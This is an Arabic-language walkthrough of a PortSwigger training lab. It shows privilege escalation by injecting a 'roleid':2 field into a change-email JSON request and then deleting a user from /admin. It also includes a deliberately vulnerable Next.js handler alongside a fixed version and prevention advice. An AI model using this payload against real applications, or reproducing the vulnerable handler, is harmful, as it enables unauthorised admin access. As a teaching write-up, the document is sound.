# Lab: User role can be modified in user profile

> **Category:** Access Control  
> **Difficulty:** APPRENTICE  
> **Lab Link:** [PortSwigger Lab - User role can be modified in user profile](https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile)

---

## 🎯 الهدف الرئيسي

استغلال ثغرة التحكم في الصلاحيات (Access Control) حيث يمكن تعديل **معامل الدور (roleid)** أثناء تحديث الملف الشخصي، ثم استخدام الصلاحية للوصول إلى لوحة التحكم `/admin` وحذف المستخدم `carlos`.

**الحساب:** `wiener:peter`

---

## 📝 الحل خطوة بخطوة

### الخطوة 1: تسجيل الدخول

- سجل الدخول بـ `wiener:peter`
- اذهب إلى **My account**

### الخطوة 2: تحديث البريد الإلكتروني

- غيّر بريدك الإلكتروني إلى أي قيمة (مثل `test@test.com`)
- اعترض الطلب في Burp

الطلب يبدو هكذا:

```http
POST /my-account/change-email HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/json
Cookie: session=YOUR-SESSION-COOKIE

{"email":"test@test.com"}
```

### الخطوة 3: ملاحظة الرد

الرد من الخادم يحتوي على `roleid`:

```json
{
  "email": "test@test.com",
  "roleid": 1
}
```

**ملاحظة:** `roleid=1` يعني مستخدم عادي، `roleid=2` يعني مدير (admin).

### الخطوة 4: تعديل الطلب لإضافة roleid

- أرسل الطلب إلى Repeater
- أضف `"roleid":2` إلى الـ JSON في جسم الطلب:

```json
{"email":"test@test.com","roleid":2}
```

### الخطوة 5: إرسال الطلب المعدل

- اضغط **Send**
- انظر إلى الرد:

```json
{
  "email": "test@test.com",
  "roleid": 2
}
```

**النتيجة:** تم تغيير `roleid` إلى 2 ✅

### الخطوة 6: الوصول إلى لوحة التحكم

- اذهب إلى `/admin`:

```
https://YOUR-LAB-ID.web-security-academy.net/admin
```

- ستظهر صفحة الإدارة ✅

### الخطوة 7: حذف المستخدم carlos

- اضغط على زر **Delete** بجانب `carlos`

### الخطوة 8: حل المختبر

بعد حذف `carlos`، سيتم حل المختبر تلقائياً ✅

---

## ملاحظات

| النقطة | الشرح |
|--------|-------|
| **أين الثغرة؟** | الخادم يقبل معامل `roleid` في طلب تحديث الملف الشخصي |
| **كيف نستغلها؟** | نضيف `"roleid":2` إلى طلب JSON لتغيير صلاحياتنا |
| **لماذا هذا خطأ؟** | الخادم يجب ألا يثق أبداً في المدخلات لتعديل الصلاحيات |
| **ماذا يعني roleid؟** | `1` = مستخدم عادي، `2` = مدير |

---

## 🛡️ Remediation & Source Code Fix

### 📌 Vulnerability Root Cause

الخادم يقبل ويطبق أي حقول JSON يرسلها المستخدم، بما فيها `roleid`، بدون التحقق من صلاحية المستخدم لتعديل هذه القيم.

---

### ❌ Non-Compliant Code (Next.js)

```javascript
// pages/api/change-email.js
export default function handler(req, res) {
  const { sessionId } = req.cookies;
  const user = getUserBySession(sessionId);
  
  // خطأ: يقبل أي حقول JSON بدون فلترة
  const updates = req.body; // {"email":"test@test.com","roleid":2}
  
  // يحدث البريد الإلكتروني و roleid معاً!
  updateUser(user.id, updates);
  
  res.json({ email: updates.email, roleid: user.roleid });
}
```

---

### ✅ Compliant Code (Next.js)

```javascript
// pages/api/change-email.js
export default function handler(req, res) {
  const { sessionId } = req.cookies;
  const user = getUserBySession(sessionId);
  
  // التصحيح: قبول فقط الحقول المسموحة
  const { email } = req.body;
  
  if (!email || typeof email !== 'string') {
    return res.status(400).json({ error: 'Invalid email' });
  }
  
  // تحديث البريد الإلكتروني فقط
  updateUserEmail(user.id, email);
  
  // إرجاع البيانات الحقيقية من قاعدة البيانات
  const updatedUser = getUserById(user.id);
  res.json({ email: updatedUser.email, roleid: updatedUser.roleid });
}
```

**الخلاصة:** 
1. لا تقبل حقول JSON غير متوقعة من المستخدم
2. استخدم قائمة بيضاء (whitelist) للحقول المسموح بتحديثها
3. لا تعتمد على المدخلات لتحديد الصلاحيات

---

## 🛡️ كيفية الوقاية (How to Prevent)

1. **قبول الحقول المسموحة فقط:** حدد الحقول التي يمكن للمستخدم تحديثها (مثل `email` فقط).
2. **لا تثق بالمدخلات:** لا تطبق أي حقل JSON يرسله المستخدم.
3. **تخزين الصلاحيات في الخادم:** roleid يجب أن يكون في قاعدة البيانات، وليس في الطلب.
4. **التحقق من الصلاحية قبل التحديث:** تأكد أن المستخدم مسموح له بتعديل هذه الحقول.

---

## 🔗 روابط مفيدة

- [PortSwigger Lab Page](https://portswigger.net/web-security/access-control/lab-user-role-can-be-modified-in-user-profile)
- [Access Control Cheat Sheet](https://portswigger.net/web-security/access-control)
